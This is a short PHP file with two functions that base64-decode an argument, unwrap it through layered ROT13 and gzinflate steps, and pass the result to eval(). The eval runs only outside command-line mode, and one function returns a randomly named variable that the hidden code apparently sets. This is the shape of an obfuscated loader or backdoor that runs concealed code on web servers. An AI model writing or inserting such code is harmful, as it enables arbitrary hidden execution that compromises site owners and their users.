<?php

function axysCalc($axys)
{
  if (php_sapi_name() !== 'cli') {
    eval(str_rot13(
      gzinflate(
        str_rot13(
          base64_decode(
            $axys
          )
        )
      )
    ));
  }

  // ddd(get_defined_vars());
}
function axysDecCl($axys)
{
  if (php_sapi_name() !== 'cli') {
    eval(str_rot13(
      gzinflate(
        str_rot13(
          base64_decode(
            $axys
          )
        )
      )
    ));
  }

  return $hjdlkdxhj498_45396fds7;
}
